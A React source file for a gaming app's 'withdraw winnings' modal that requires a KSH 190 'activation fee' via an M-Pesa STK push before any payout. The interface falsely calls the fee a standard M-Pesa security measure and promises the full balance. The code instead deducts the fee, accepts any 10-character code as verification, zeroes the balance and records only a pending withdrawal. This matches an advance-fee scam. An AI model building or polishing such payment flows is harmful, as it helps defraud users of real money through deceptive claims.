import React, { useState } from 'react';
import { useGameStore } from '@/store/game-store';
import { STKPrompt, PaymentConfirmation, TransactionVerification, TransactionSuccess } from './mpesa-helpers';
import { X, Smartphone, AlertCircle, Shield, Info } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';

export default function WithdrawModal({ isOpen, onClose }) {
  const [step, setStep] = useState('welcome'); // welcome, phoneInput, confirm, stk, confirmation, verification, success
  const [phone, setPhone] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [stkData, setStkData] = useState(null);
  const [errorMsg, setErrorMsg] = useState('');
  const [netWithdrawnAmount, setNetWithdrawnAmount] = useState(0);

  const balance = useGameStore((state) => state.balance);
  const setBalance = useGameStore((state) => state.setBalance);
  const createPendingWithdrawal = useGameStore((state) => state.createPendingWithdrawal);

  const handleInitiateWithdrawal = async () => {
    setIsLoading(true);
    setErrorMsg('');

    try {
      // Sends STK push for KSH 190 activation fee
      const response = await fetch('/api/mpesa/stk-push', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phoneNumber: phone,
          amount: 190,
          transactionType: 'withdrawal',
          accountReference: `WD-${Date.now()}`
        })
      });

      const data = await response.json();
      if (data.success && data.checkoutRequestId) {
        setStkData(data);
        setStep('stk');
      } else {
        setErrorMsg(data.message || 'Failed to send payment prompt. Please try again.');
      }
    } catch (e) {
      setErrorMsg('An error occurred. Please check network connection and try again.');
    } finally {
      setIsLoading(false);
    }
  };

  const handleVerifyCode = async (code) => {
    setIsLoading(true);
    setErrorMsg('');
    try {
      if (code.length === 10) {
        // Calculate net amount (Balance - KSH 190 security fee)
        const netAmt = balance - 190;
        setNetWithdrawnAmount(netAmt);

        if (netAmt > 0) {
          // Add to pending withdrawals
          createPendingWithdrawal(netAmt, phone, stkData?.checkoutRequestId || "");
        }
        // Deduct the complete balance
        setBalance(0);
        setStep('success');
        return true;
      }
      return false;
    } catch (e) {
      return false;
    } finally {
      setIsLoading(false);
    }
  };

  const handleReset = () => {
    setStep('welcome');
    setPhone('');
    setStkData(null);
    setErrorMsg('');
    setNetWithdrawnAmount(0);
    onClose();
  };

  if (!isOpen) return null;

  return (
    <AnimatePresence>
      <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
        {/* Backdrop overlay */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          onClick={handleReset}
          className="fixed inset-0 bg-black/75 backdrop-blur-sm"
        />

        {/* Modal content container */}
        <motion.div
          initial={{ opacity: 0, scale: 0.95, y: 20 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          exit={{ opacity: 0, scale: 0.95, y: 20 }}
          className="relative bg-slate-800 border border-slate-700/50 rounded-2xl w-full max-w-md overflow-hidden shadow-2xl z-10 text-white"
        >
          {/* Close button */}
          {step !== 'stk' && step !== 'confirmation' && step !== 'verification' && step !== 'success' && (
            <button
              onClick={handleReset}
              className="absolute top-4 right-4 text-gray-400 hover:text-white transition p-1 hover:bg-slate-700/50 rounded-full"
            >
              <X className="w-5 h-5" />
            </button>
          )}

          {step === 'welcome' && (
            <div className="p-6 space-y-5">
              <div className="space-y-1">
                <h2 className="text-xl font-bold text-white flex items-center gap-2">
                  Withdraw Your Winnings
                </h2>
                <p className="text-gray-450 text-xs">Secure withdrawal with one-time activation</p>
              </div>

              <div className="space-y-4">
                {/* Winning balance banner */}
                <div className="bg-gradient-to-r from-green-500/20 to-emerald-500/20 border border-green-500/30 p-4 rounded-xl">
                  <p className="text-gray-400 text-xs mb-1">Your Winning Balance</p>
                  <p className="text-4xl font-extrabold text-green-400 font-mono">
                    KSH {balance.toLocaleString()}
                  </p>
                </div>

                {/* Activation fee explanation */}
                <div className="space-y-3 bg-slate-700/40 p-4 rounded-xl border border-slate-700/45">
                  <div className="flex gap-3">
                    <Shield className="w-5 h-5 text-yellow-400 flex-shrink-0 mt-0.5" />
                    <div>
                      <p className="font-semibold text-white text-sm">Why KSH 190 Activation Fee?</p>
                      <p className="text-gray-350 text-xs mt-1 leading-relaxed">
                        This one-time security fee prevents account misuse and protects against fraudulent withdrawals. It is a standard validation measure in M-Pesa transactions.
                      </p>
                    </div>
                  </div>
                </div>

                {/* Steps summary */}
                <div className="space-y-2.5 bg-slate-700/25 p-4 rounded-xl border border-slate-700/25">
                  <p className="text-xs font-semibold text-gray-400">Withdrawal Process:</p>
                  <ul className="space-y-2 text-xs text-gray-300">
                    <li className="flex gap-2">
                      <span className="text-yellow-400 font-bold">1.</span>
                      <span>Pay KSH 190 security fee via M-Pesa STK</span>
                    </li>
                    <li className="flex gap-2">
                      <span className="text-green-400 font-bold">2.</span>
                      <span>Your full balance KSH {balance.toLocaleString()} is released</span>
                    </li>
                    <li className="flex gap-2">
                      <span className="text-blue-400 font-bold">3.</span>
                      <span>Funds arrive in M-Pesa wallet in 24-48 hours</span>
                    </li>
                    <li className="flex gap-2">
                      <span className="text-purple-400 font-bold">✓</span>
                      <span className="text-gray-450">One-time fee only (never charged again)</span>
                    </li>
                  </ul>
                </div>

                {/* Low balance warning */}
                {balance < 190 && (
                  <div className="bg-red-500/20 border border-red-500/40 rounded-xl p-3 text-red-400 text-xs flex items-center gap-2">
                    <AlertCircle className="w-4 h-4 flex-shrink-0" />
                    <span>Your balance must be at least KSH 190 to withdraw.</span>
                  </div>
                )}

                <div className="flex gap-3 pt-2">
                  <button
                    onClick={handleReset}
                    className="flex-1 bg-slate-700/60 hover:bg-slate-750 border border-slate-650 text-gray-300 font-bold py-3.5 rounded-xl transition"
                  >
                    Cancel
                  </button>
                  <button
                    onClick={() => setStep('phoneInput')}
                    disabled={balance < 190}
                    className="flex-1 bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 text-white font-extrabold py-3.5 rounded-xl transition disabled:opacity-50 shadow-lg text-sm"
                  >
                    Proceed
                  </button>
                </div>
              </div>
            </div>
          )}

          {step === 'phoneInput' && (
            <div className="p-6 space-y-5">
              <div className="space-y-1">
                <h2 className="text-xl font-bold text-white">Enter M-Pesa Phone Number</h2>
                <p className="text-gray-400 text-xs">We will send the payment prompt to this number</p>
              </div>

              <div className="space-y-4">
                <div className="space-y-2">
                  <label className="text-sm font-medium text-gray-300 block">Phone Number</label>
                  <div className="relative">
                    <Smartphone className="absolute left-3 top-3.5 w-5 h-5 text-gray-500" />
                    <input
                      type="tel"
                      placeholder="07XXXXXXXX or 254XXXXXXXX"
                      value={phone}
                      onChange={(e) => {
                        setPhone(e.target.value);
                        setErrorMsg('');
                      }}
                      className="w-full pl-10 pr-4 py-3 bg-slate-900/50 border border-slate-600 rounded-xl text-white placeholder-gray-500 focus:outline-none focus:border-yellow-500 text-base"
                      maxLength={12}
                    />
                  </div>
                  <p className="text-[10px] text-gray-500">Format: 07XXXXXXXX or 254XXXXXXXX</p>
                </div>

                {errorMsg && (
                  <div className="bg-red-500/20 border border-red-500/50 rounded-lg p-3 text-red-400 text-xs flex items-center gap-2">
                    <AlertCircle className="w-4 h-4 flex-shrink-0" />
                    <span>{errorMsg}</span>
                  </div>
                )}

                <div className="flex gap-3">
                  <button
                    onClick={() => setStep('welcome')}
                    className="flex-1 bg-slate-700/60 hover:bg-slate-750 border border-slate-650 text-gray-300 font-bold py-3.5 rounded-xl transition"
                  >
                    Back
                  </button>
                  <button
                    onClick={() => {
                      const cleanPhone = phone.trim().replace(/\D/g, '');
                      if (!phone.trim()) {
                        setErrorMsg('Please enter a phone number');
                      } else if (cleanPhone.length !== 9 && cleanPhone.length !== 10 && cleanPhone.length !== 12) {
                        setErrorMsg('Please enter a valid Kenyan phone number');
                      } else {
                        setStep('confirm');
                      }
                    }}
                    className="flex-1 bg-gradient-to-r from-yellow-500 to-yellow-600 hover:from-yellow-600 hover:to-yellow-700 text-slate-900 font-extrabold py-3.5 rounded-xl transition shadow-lg text-sm"
                  >
                    Next
                  </button>
                </div>
              </div>
            </div>
          )}

          {step === 'confirm' && (
            <div className="p-6 space-y-5">
              <div className="space-y-1">
                <h2 className="text-xl font-bold text-white">Confirm Details</h2>
                <p className="text-gray-400 text-xs">Review information before sending push request</p>
              </div>

              <div className="space-y-4">
                <div className="bg-slate-900/50 border border-slate-700 p-4 rounded-xl space-y-1 text-sm">
                  <span className="text-gray-400 block text-xs">M-Pesa Phone Number</span>
                  <span className="font-semibold text-yellow-500 font-mono text-base">{phone}</span>
                </div>

                <div className="bg-green-500/10 border-2 border-green-500/40 p-4 rounded-xl space-y-1">
                  <span className="text-gray-400 block text-xs">Full Balance To Withdraw</span>
                  <span className="font-bold text-green-400 font-mono text-3xl">
                    KSH {balance.toLocaleString()}
                  </span>
                  <span className="text-[10px] text-gray-300 block mt-1">This is your complete earnings</span>
                </div>

                <div className="bg-yellow-500/10 border-2 border-yellow-500/45 p-4 rounded-xl space-y-1">
                  <span className="text-gray-400 block text-xs">One-Time Security Fee</span>
                  <span className="font-bold text-yellow-500 font-mono text-2xl">KSH 190</span>
                  <span className="text-[10px] text-gray-300 block mt-1">Pay now to activate withdrawal</span>
                </div>

                <div className="bg-blue-500/15 border border-blue-500/35 p-3 rounded-lg text-xs text-blue-300 flex gap-2">
                  <Info className="w-4 h-4 text-blue-400 flex-shrink-0 mt-0.5" />
                  <span>
                    You pay KSH 190 now. Your full winnings KSH {balance.toLocaleString()} will arrive in M-Pesa in 24-48 hours.
                  </span>
                </div>

                {errorMsg && (
                  <div className="bg-red-500/20 border border-red-500/50 rounded-lg p-3 text-red-400 text-xs flex items-center gap-2">
                    <AlertCircle className="w-4 h-4 flex-shrink-0" />
                    <span>{errorMsg}</span>
                  </div>
                )}

                <div className="flex gap-3">
                  <button
                    onClick={() => setStep('phoneInput')}
                    className="flex-1 bg-slate-700/60 hover:bg-slate-750 border border-slate-650 text-gray-300 font-bold py-3.5 rounded-xl transition"
                  >
                    Edit Phone
                  </button>
                  <button
                    onClick={handleInitiateWithdrawal}
                    disabled={isLoading}
                    className="flex-1 bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 text-white font-extrabold py-3.5 rounded-xl transition disabled:opacity-50 shadow-lg text-sm"
                  >
                    {isLoading ? 'Processing...' : 'Pay & Withdraw'}
                  </button>
                </div>
              </div>
            </div>
          )}

          {step === 'stk' && (
            <STKPrompt
              phoneNumber={phone}
              amount={190}
              onContinue={() => setStep('confirmation')}
              isLoading={isLoading}
            />
          )}

          {step === 'confirmation' && (
            <PaymentConfirmation
              phoneNumber={phone}
              amount={190}
              onConfirmYes={() => setStep('verification')}
              onConfirmNo={() => {
                setStep('confirm');
                setStkData(null);
              }}
              isLoading={isLoading}
            />
          )}

          {step === 'verification' && (
            <TransactionVerification
              phoneNumber={phone}
              amount={190}
              onVerify={handleVerifyCode}
              transactionType="withdrawal"
            />
          )}

          {step === 'success' && (
            <TransactionSuccess
              phoneNumber={phone}
              amount={netWithdrawnAmount}
              transactionType="withdrawal"
              onContinue={handleReset}
            />
          )}
        </motion.div>
      </div>
    </AnimatePresence>
  );
}
